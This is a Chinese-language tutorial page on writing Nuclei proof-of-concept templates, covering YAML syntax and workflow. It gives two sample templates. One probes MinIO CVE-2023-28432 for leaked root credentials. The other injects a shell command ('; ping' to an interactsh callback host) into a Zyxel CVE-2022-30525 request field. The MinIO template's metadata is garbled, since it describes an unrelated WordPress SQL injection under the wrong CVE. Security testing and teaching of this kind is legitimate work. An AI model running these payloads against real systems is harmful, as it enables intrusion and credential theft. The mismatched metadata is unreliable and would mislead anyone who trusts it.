## 开发文档参考资料

https://docs.nuclei.sh/template-guide/introduction
https://blog.csdn.net/qq_41315957/article/details/126594572
https://blog.csdn.net/qq_41315957/article/details/126594670

## Nuclei-Poc开发-Yaml语法&匹配提取

YAML是一种数据序列化语言，它的基本语法规则注意如下：

- 大小写敏感
- 使用缩进表示层级关系
- 缩进时不允许使用Tab键，只允许使用空格。
- 缩进的空格数目不重要，只要相同层级的元素左侧对齐即可

## Yaml Poc模版

1、编号 id
2、信息 info
3、请求 http file tcp等
4、匹配 matchers Interactsh
5、提取 extractors

## 开发流程：

0、poc模版套用修改
1、poc创建独立编号
2、poc填入详细信息
3、poc提交协议流程编写
4、poc结果匹配模式判断
5、poc结果提取模式判断

## CVE-2023-28432 （匹配结果）

https://github.com/vulhub/vulhub/blob/master/minio/CVE-2023-28432/README.zh-cn.md

```
id: CVE-2023-28432

info:
  name: MinIO
  author: xiaodisec
  severity: high
  description: |
    WordPress 
  mpact: |
    Successful exploitation of this vulnerability could allow an authenticated attacker to execute arbitrary SQL queries on the WordPress database, potentially leading to unauthorized access, data manipulation, or privilege escalation.
  remediation: Fixed in version 10.8.
  reference:
    - https://wpscan.com/vulnerability/6a3b6752-8d72-4ab4-9d49-b722a947d2b0
    - https://wordpress.org/plugins/wp-tripadvisor-review-slider/
    - https://nvd.nist.gov/vuln/detail/CVE-2023-0261
    - https://github.com/ARPSyndicate/cvemon
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 8.8
    cve-id: CVE-2023-28432
    cwe-id: CWE-89
    epss-score: 0.3054
    epss-percentile: 0.96509
    cpe: cpe:2.3:a:ljapps:wp_tripadvisor_review_slider:*:*:*:*:*:wordpress:*:*
  metadata:
    verified: true
    max-request: 2
    vendor: ljapps
    product: wp_tripadvisor_review_slider
    framework: wordpress
  tags: time-based-sqli,cve2023,cve,wordpress,wp,wp-tripadvisor-review-slider,auth,sqli,wp-plugin,wpscan,ljapps

http:
  - raw:
      - |
        POST /minio/bootstrap/v1/verify HTTP/1.1
        Host: {{Hostname}}
        Accept-Encoding: gzip, deflate
        Accept: */*
        Accept-Language: en-US;q=0.9,en;q=0.8
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.178 Safari/537.36
        Connection: close
        Cache-Control: max-age=0
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 0

    matchers:
      - type: word
        words:
          - 'MINIO_ROOT_USER'
          - 'MINIO_ROOT_PASSWORD'
        condition: and

```

## CVE-2022-30525（匹配交互）

blog.csdn.net/weixin_43080961/article/details/124776553

```
id: CVE-2022-30525

info:
  name: xiaodisec
  author: remote
  severity: high
  tags: CVE-2022-30525
  reference: CVE-2022-30525

requests:
  - raw:
      - |
        POST /ztp/cgi-bin/handler HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json; charset=utf-8
        
        {"command": "setWanPortSt","proto": "dhcp","port": "1270","vlan_tagged": "1270","vlanid": "1270","mtu": "{{exploit_payload}}","data":""}
    
    payloads:
      exploit_payload:
        - "; ping -c 3 {{interactsh-url}};"
    attack: pitchfork
    matchers:
      - type: word
        part: interactsh_protocol
        name: dns
        words:
          - "dns"

```

## Nuclei-Poc开发-BurpSuite模版生成插件

https://github.com/projectdiscovery/nuclei-burp-plugin